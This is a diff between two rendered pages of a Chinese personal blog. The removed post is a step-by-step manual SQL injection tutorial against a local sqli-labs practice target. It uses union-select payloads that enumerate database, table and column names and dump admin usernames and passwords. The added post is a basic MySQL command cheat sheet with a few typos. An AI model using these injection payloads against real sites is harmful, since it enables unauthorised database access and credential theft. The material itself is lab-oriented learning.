@@ -103,18 +103,18 @@
 
 
 
-  <meta name="description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     (注释：# , – ) http://127.0.0.1:8080/?id=1&amp;#39;  （报错） http://127.0.0.1:8080/?id=1 and 1=1 --+ （正常） http://127.0.0">
+  <meta name="description" content="常用mysql命令  创建数据库1create database db_name charset=utf8;   查看数据库1show database;   选择数据库1use db_name;   创建表 创建user字段和主键和类型12345create table table_name(user varchar(255) not null primAry key)charset=utf8;">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="注入学习">
-<meta property="og:url" content="http://weiblog.xyz/2018/10/17/注入学习/index.html">
+<meta property="og:title" content="sql学习">
+<meta property="og:url" content="http://weiblog.xyz/2019/05/30/sql学习/index.html">
 <meta property="og:site_name" content="黑色褪去，呼唤君之名">
-<meta property="og:description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     (注释：# , – ) http://127.0.0.1:8080/?id=1&amp;#39;  （报错） http://127.0.0.1:8080/?id=1 and 1=1 --+ （正常） http://127.0.0">
+<meta property="og:description" content="常用mysql命令  创建数据库1create database db_name charset=utf8;   查看数据库1show database;   选择数据库1use db_name;   创建表 创建user字段和主键和类型12345create table table_name(user varchar(255) not null primAry key)charset=utf8;">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-05-30T12:29:21.771Z">
+<meta property="og:updated_time" content="2019-05-30T12:46:58.630Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="注入学习">
-<meta name="twitter:description" content="1、手工测试是否存在注入点靶场： sqli-labs （sql注入学习游戏教程）     下载地址：https://github.com/Audi-1/sqli-labs     (注释：# , – ) http://127.0.0.1:8080/?id=1&amp;#39;  （报错） http://127.0.0.1:8080/?id=1 and 1=1 --+ （正常） http://127.0.0">
+<meta name="twitter:title" content="sql学习">
+<meta name="twitter:description" content="常用mysql命令  创建数据库1create database db_name charset=utf8;   查看数据库1show database;   选择数据库1use db_name;   创建表 创建user字段和主键和类型12345create table table_name(user varchar(255) not null primAry key)charset=utf8;">
 
 
 
@@ -122,7 +122,7 @@
 
   
   
-  <link rel="canonical" href="http://weiblog.xyz/2018/10/17/注入学习/"/>
+  <link rel="canonical" href="http://weiblog.xyz/2019/05/30/sql学习/"/>
 
 
 
@@ -132,7 +132,7 @@
   };
 </script>
 
-  <title>注入学习 | 黑色褪去，呼唤君之名</title>
+  <title>sql学习 | 黑色褪去，呼唤君之名</title>
   
 
 
@@ -352,7 +352,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://weiblog.xyz/2018/10/17/注入学习/"/>
+    <link itemprop="mainEntityOfPage" href="http://weiblog.xyz/2019/05/30/sql学习/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="拜咯"/>
@@ -369,7 +369,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">注入学习
+          <h1 class="post-title" itemprop="name headline">sql学习
 
               
             
@@ -395,24 +395,12 @@
                 
               
 
-              <time title="创建时间：2018-10-17 17:48:33" itemprop="dateCreated datePublished" datetime="2018-10-17T17:48:33+08:00">2018-10-17</time>
+              <time title="创建时间：2019-05-30 16:55:00 / 修改时间：20:46:58" itemprop="dateCreated datePublished" datetime="2019-05-30T16:55:00+08:00">2019-05-30</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-05-30 20:29:21" itemprop="dateModified" datetime="2019-05-30T20:29:21+08:00">2019-05-30</time>
               
             
           </span>
@@ -446,20 +434,48 @@
       
 
       
-        <h3 id="1、手工测试是否存在注入点"><a href="#1、手工测试是否存在注入点" class="headerlink" title="1、手工测试是否存在注入点"></a>1、手工测试是否存在注入点</h3><p>靶场：</p>
-<p>sqli-labs （sql注入学习游戏教程）     下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>    </p>
-<p>(注释：# , – )</p>
-<p><code>http://127.0.0.1:8080/?id=1&#39;  （报错）</code></p>
-<p><code>http://127.0.0.1:8080/?id=1 and 1=1 --+ （正常）</code></p>
-<p><code>http://127.0.0.1:8080/?id=1 and 1=2 --+     （报错）</code></p>
-<p>存在注入</p>
-<h3 id="2、猜字段"><a href="#2、猜字段" class="headerlink" title="2、猜字段"></a>2、猜字段</h3><p><code>http://127.0.0.1:8080/?id=1 order by 2   （尝试不同的字段数直到页面在正常和不正常之间）</code></p>
-<h3 id="3、查库名"><a href="#3、查库名" class="headerlink" title="3、查库名"></a>3、查库名</h3><p><code>http://127.0.0.1:8080/?id=1 union select 1,database() limit 1,1 --+</code> </p>
-<p>（(union  联合语句） （limit子句可以用于强制select语句返回制定的记录数，limit接受一个或两个数字的参数，如果给定两个参数第一个指定返回记录行的偏移量，第二个指定返回记录行的最大数目。） ）</p>
-<h3 id="4、查表名"><a href="#4、查表名" class="headerlink" title="4、查表名"></a>4、查表名</h3><p><code>http://127.0.0.1:8080/?id=1 union select 1,table_name from information_schema.tables where table_schema = &#39;maoshe&#39; limit 1,1--</code> </p>
-<h3 id="5、查字段"><a href="#5、查字段" class="headerlink" title="5、查字段"></a>5、查字段</h3><p><code>http://127.0.0.1:8080/?id=1 union select 1,column_name from information_schema.columns where table_schema = &#39;maoshe&#39; and table_name = &#39;admin&#39; limit 1,1 --</code> </p>
-<h3 id="6、查字段内容"><a href="#6、查字段内容" class="headerlink" title="6、查字段内容"></a>6、查字段内容</h3><p><code>http://127.0.0.1:8080/?id=1 union select 1,username from admin limit 1,1 --</code> </p>
-<p><code>http://127.0.0.1:8080/?id=1 union select 1,group_concat(id,username,password) from admin limit 1,1 --</code> </p>
+        <h3 id="常用mysql命令"><a href="#常用mysql命令" class="headerlink" title="常用mysql命令"></a>常用mysql命令</h3><hr>
+<blockquote>
+<p>创建数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database db_name charset=utf8;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>查看数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show database;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>选择数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use db_name;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>创建表 创建user字段和主键和类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table table_name(user varchar(255) not null primAry key)charset=utf8;</span><br><span class="line">alter table table_name add password varchar(255);</span><br><span class="line">// 添加字段</span><br><span class="line">alter table table_name drop password varchar(255);</span><br><span class="line">// 删除password字段</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>删除表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table table_name;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>插入数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table_name values (&apos;admin&apos;,123456);</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>修改数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update hack set user = &apos;[new_name]&apos; where user=&apos;[old_name]&apos;;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>查数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<hr>
+<h3 id="sql语法"><a href="#sql语法" class="headerlink" title="sql语法"></a>sql语法</h3><hr>
+<blockquote>
+<p>SELECT 语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column1，column2 from table_name; // 从表中提取字段1和2</span><br><span class="line">select * from table_name;  // 从表中提取所有字段</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>SELECT DISTINCT 语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select distinct column1, column2, ... from table_name;</span><br><span class="line">// 仅返回不同的值  去除相同的</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>WHERE 语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column1,column2, ... from table_name where condition;</span><br><span class="line">// 从表中提取字段中满足dondition[条件]的内容</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>AND ，OR ，NOT 语法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select column1, column2, ... from table_name where condition1 and condition2 and contion3 ...; </span><br><span class="line">// 从表中提取字段中满足dondition1[条件],condition2,contion3的内容</span><br><span class="line">select column1, column2, ... from table_name where condition1 or condition2 or contion3 ...; </span><br><span class="line">// 从表中提取字段中满足dondition1[条件],condition2,contion3中任意一个条件的内容</span><br><span class="line">select column1, column2, ... from table_name where not condition;</span><br><span class="line">//从表中提取字段中不满足dondition1[条件]的内容</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>ORDER BY<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column1, column2, ... from table_name order by column2</span><br><span class="line">// 从表中提取字段内容对结果按照column2进行排序</span><br></pre></td></tr></table></figure></p>
+</blockquote>
 
       
     </div>
@@ -496,15 +512,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/10/17/注入学习/" rel="next" title="注入学习">
+                <i class="fa fa-chevron-left"></i> 注入学习
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/30/sql学习/" rel="prev" title="sql学习">
-                sql学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -634,7 +650,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、手工测试是否存在注入点"><span class="nav-number">1.</span> <span class="nav-text">1、手工测试是否存在注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、猜字段"><span class="nav-number">2.</span> <span class="nav-text">2、猜字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、查库名"><span class="nav-number">3.</span> <span class="nav-text">3、查库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、查表名"><span class="nav-number">4.</span> <span class="nav-text">4、查表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、查字段"><span class="nav-number">5.</span> <span class="nav-text">5、查字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、查字段内容"><span class="nav-number">6.</span> <span class="nav-text">6、查字段内容</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用mysql命令"><span class="nav-number">1.</span> <span class="nav-text">常用mysql命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql语法"><span class="nav-number">2.</span> <span class="nav-text">sql语法</span></a></li></ol></div>
             
 
           </div>
